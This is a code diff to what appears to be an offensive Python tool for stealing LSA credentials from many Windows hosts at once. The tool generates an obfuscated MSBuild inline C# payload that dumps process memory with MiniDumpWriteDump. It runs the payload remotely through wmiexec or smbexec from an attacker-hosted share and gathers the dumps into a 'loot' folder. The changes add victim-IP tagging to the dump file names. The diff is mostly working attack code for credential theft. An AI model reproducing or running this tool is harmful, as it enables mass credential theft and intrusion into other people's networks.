@@ -755,21 +755,11 @@ def do_ip(inpu, local_ip): # check if the inputted ips are up so we dont scan th
     except:
         pass
 
-    hostnames = []
-    ips_from_hostnames = []
-    for ip in uphosts:
-        try:
-            tmp = socket.gethostbyaddr(ip)[0]
-            hostnames.append(tmp)
-            ips_from_hostnames.append(socket.gethostbyname(tmp))
-        except:
-            pass
-
     print('[scan complete]')
 
-    return uphosts, hostnames, ips_from_hostnames
+    return uphosts
 
-def gen_payload(share_name, payload_name, drive_letter):
+def gen_payload(share_name, payload_name, drive_letter, addresses_array):
     targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -791,6 +781,12 @@ def gen_payload(share_name, payload_name, drive_letter):
     l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    ipEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
     xml_payload = "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n"
     xml_payload += "<!-- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe SimpleTasks.csproj -->\n"
@@ -805,7 +801,7 @@ def gen_payload(share_name, payload_name, drive_letter):
 
     xml_payload += "              <Code Type=\"Class\" Language=\"cs\">\n"
     xml_payload += "              <![CDATA[\n"
-    xml_payload += "using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n"
+    xml_payload += "using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; using System.IO; using System.Linq;\n"
     xml_payload += "public class %s : Task, ITask {\n" % (taskname)
     xml_payload += "		public enum Typ : uint\n"
     xml_payload += "        {\n"
@@ -874,7 +870,20 @@ def gen_payload(share_name, payload_name, drive_letter):
     xml_payload += "		{\n"
     xml_payload += "            if (%s())\n" % (IsAdministrator)
     xml_payload += "            {\n"
-    xml_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + \".dmp\";\n" % (drive_letter)
+    xml_payload += "                var %s = System.IO.File.ReadLines(\"%s:\\\\%s.txt\").ToArray();\n" % (lines, drive_letter, addresses_file)
+    xml_payload += "                string %s = \"\";\n" % (thismachinesip)
+    xml_payload += "                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n" % (ipEntry)
+    xml_payload += "                foreach (var %s in %s.AddressList)\n" % (ip, ipEntry)
+    xml_payload += "                {\n"
+    xml_payload += "                    for (int %s = 0; %s < %s.Length; %s++)\n" % (i, i, lines, i)
+    xml_payload += "                    {\n"
+    xml_payload += "                        if (%s.ToString() == %s[%s].ToString())\n" % (ip, lines, i)
+    xml_payload += "                        {\n"
+    xml_payload += "                            %s = \"-\" + %s.ToString();\n" % (thismachinesip, ip)
+    xml_payload += "                        }\n"
+    xml_payload += "                    }\n"
+    xml_payload += "                }\n"
+    xml_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + %s + \".dmp\";\n" % (drive_letter, thismachinesip)
     xml_payload += "                Process %s = Process.GetProcessById(%s());\n" % (p, GetPID)
     xml_payload += "                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);\n" % (Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
 
@@ -888,6 +897,10 @@ def gen_payload(share_name, payload_name, drive_letter):
     xml_payload += "</Project>"
     with open('/var/tmp/{}/{}.xml'.format(share_name, payload_name), 'w') as f:
         f.write(xml_payload)
+        f.close()
+    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
+        for addr in addresses_array:
+            f.write(addr + "\n")
         f.close()
 
 def setup_share():
@@ -1304,7 +1317,7 @@ if __name__ == '__main__':
                 print("local IP => " + local_ip)
 
         if '-oe' not in sys.argv: # why scan if we not gonna do anything
-            addresses, hostnames, ips_from_hostnames = do_ip(address, local_ip) # gets a list of up hosts
+            addresses = do_ip(address, local_ip) # gets a list of up hosts
 
             if len(addresses) > 500: # ensure that they dont waste over 25 gb of storage
                 print("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses)*52)/1024)))
@@ -1319,7 +1332,11 @@ if __name__ == '__main__':
         if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False:
             drive_letter = auto_drive(addresses, domain)
 
-        gen_payload(share_name, payload_name, drive_letter) # creates the payload
+        if options.oe:
+            addresses = ['23423.5463.1234.3465']
+
+        gen_payload(share_name, payload_name, drive_letter, addresses) # creates the payload
+
 
         print("\n[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
         command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
@@ -1356,19 +1373,13 @@ if __name__ == '__main__':
         os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
 
         with open('{}/log.txt'.format(cwd), 'a') as f:
-            f.write('Extracted LSA: {}/{}\n'.format(len([name for name in os.listdir("{}/loot/{}".format(cwd, timestamp)) if os.path.isfile(os.path.join("{}/loot/{}".format(cwd, timestamp), name))])-1, len(addresses)))
+            f.write('Total Extracted LSA: {}/{}\n'.format(len([name for name in os.listdir("{}/loot/{}".format(cwd, timestamp)) if os.path.isfile(os.path.join("{}/loot/{}".format(cwd, timestamp), name))])-1, len(addresses)))
             f.close()
         # for when you're attacking a lot of targets to quickly see how many we got
-        print('\n{} Total Extracted LSA: {}/{}\n'.format(green_plus, len([name for name in os.listdir("{}/loot/{}".format(cwd, timestamp)) if os.path.isfile(os.path.join("{}/loot/{}".format(cwd, timestamp), name))])-1, len(addresses)))
+        print('\n{} Total Extracted LSA: {}/{}\n'.format(green_plus, len([name for name in os.listdir("{}/loot/{}".format(cwd, timestamp)) if os.path.isfile(os.path.join("{}/loot/{}".format(cwd, timestamp), name))])-2, len(addresses)))
 
         if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
             os.system('sudo rm {}/drives.txt'.format(cwd))
-
-        dmp_files = [f for f in os.listdir("{}/loot/{}/".format(cwd, timestamp)) if f.endswith('.dmp')] # this should enable us to change the filenames to hostname_ip.dmp
-        for file in dmp_files:
-            for name in hostnames:
-                if file[:file.find(".")].lower() == name[:name.find(".")].lower():
-                    os.system("mv {}/loot/{}/{} {}/loot/{}/{}.dmp".format(cwd, timestamp, file, cwd, timestamp, (file[:file.find(".")] + "_" + ips_from_hostnames[hostnames.index(name)])))
 
         if options.ap != False:
             print("\n[parsing files]")
